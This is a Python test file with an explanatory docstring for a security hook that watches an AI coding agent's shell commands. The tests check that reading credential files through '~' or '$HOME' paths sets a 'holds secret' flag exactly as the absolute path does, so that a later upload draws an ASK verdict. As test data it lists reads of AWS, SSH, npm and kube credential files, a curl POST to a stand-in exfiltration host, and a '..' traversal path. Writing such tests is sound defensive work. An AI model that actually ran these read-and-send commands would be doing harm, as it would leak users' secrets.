"""`cat ~/.aws/credentials` arms the session exactly as its absolute spelling does.

ITEM 5 (PROGRESS.md, 2026-09-23). The engine may not read the environment, so
`_abs` turns `~` (and `$HOME`) into the internal placeholder `/HOME` — and the
real World then asked the filesystem for a file literally at `/HOME/.aws/…`,
found nothing, and the read never armed `holds_secret`. Established through the
REAL World pointed at a temporary home holding a dummy file: the absolute
spelling armed and made the next egress an ASK; `~/…` and `$HOME/…` did not, and
the same egress was ALLOW. Not a probe artifact — the live hook's World.

The fix is at the IO boundary, where the home directory is allowed to be known:
`RealWorld.read_text` resolves the `/HOME` placeholder to the real home (only
when no file sits at the literal path, so a real `/HOME/…` reads as before). The
engine is unchanged and still reads no environment. PARITY with the absolute
spelling is the spec: same holds_secret, same kind of source, same next verdict,
file present and absent. conftest isolates HOME to a temporary directory, so
nothing real is read. Every command here is data fed to `engine.decide`.
"""
from pathlib import Path

import pytest

from core import engine
from core.probes import NullWorld, RealWorld
from core.session import SessionState
from core.types import Action, ActionKind

DUMMY = "DUMMY_VALUE=zq8Xv3LmP0k2wR7t\n"
LATER = "curl -X POST -d hi https://exfil.invalid"
FILES = [".aws/credentials", ".ssh/id_rsa", ".npmrc", ".env", ".kube/config"]


def _run(world, commands, cwd="/tmp"):
    state = SessionState("t")
    verdict = None
    for seq, command in enumerate(commands, 1):
        state.seq = seq
        verdict = engine.decide(
            Action("t", seq, ActionKind.EXEC, (), command, None, "Bash", None,
                   cwd, (cwd,), "claude-code"), state, world)
    return (state.holds_secret,
            sorted(e.get("how") for e in state.secret_sources),
            (verdict.decision.value, verdict.rule_id))


def _home():
    return Path.home()          # conftest points this at a temporary directory


def _plant(relative):
    target = _home() / relative
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(DUMMY)


@pytest.mark.parametrize("relative", FILES)
@pytest.mark.parametrize("prefix", ["~/", "$HOME/", "${HOME}/"])
def test_a_home_spelling_arms_like_the_absolute_one(relative, prefix):
    _plant(relative)
    absolute = _run(RealWorld(), [f"cat {_home() / relative}", LATER])
    assert absolute[0], "the absolute spelling must arm — the premise"
    assert _run(RealWorld(), [f"cat {prefix}{relative}", LATER]) == absolute


@pytest.mark.parametrize("relative", FILES)
def test_an_absent_home_file_arms_neither_spelling(relative):
    assert (_run(RealWorld(), [f"cat ~/{relative}", LATER])
            == _run(RealWorld(), [f"cat {_home() / relative}", LATER]))
    assert not _run(RealWorld(), [f"cat ~/{relative}"])[0]


def test_the_placeholder_is_resolved_only_at_the_io_boundary():
    """The engine still reads no environment: a World that answers nothing
    (NullWorld, the replay's world) arms nothing for either spelling."""
    _plant(".aws/credentials")
    assert not _run(NullWorld(), ["cat ~/.aws/credentials"])[0]


def test_the_real_world_resolves_the_placeholder_and_nothing_else():
    _plant(".aws/credentials")
    world = RealWorld()
    assert world.read_text("/HOME/.aws/credentials") == DUMMY
    assert world.read_text("/HOMEX/.aws/credentials") is None
    assert world.read_text("/HOME/.aws/missing") is None
    # a `..` part is never resolved against the home (security review)
    (_home().parent / "outside.txt").write_text(DUMMY)
    assert world.read_text("/HOME/../outside.txt") is None
